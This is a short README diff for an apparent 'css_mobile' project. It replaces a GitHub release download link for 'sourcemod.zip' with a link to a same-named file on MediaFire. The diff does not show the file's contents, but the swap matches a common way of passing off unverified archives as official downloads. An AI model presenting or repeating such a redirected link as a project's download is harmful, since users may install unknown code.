@@ -33,7 +33,7 @@
 ## 📦 Download
 
 <p align="center">
-  <a href="https://github.com/j-chcode/css_mobile/releases/tag/v4/sourcemod.zip">
+  <a href="https://www.mediafire.com/file/9d17o71rex8206x/sourcemod.zip/file">
     <img src="https://img.shields.io/badge/Download-ZIP%20Package-red?style=for-the-badge" />
   </a>
 </p>
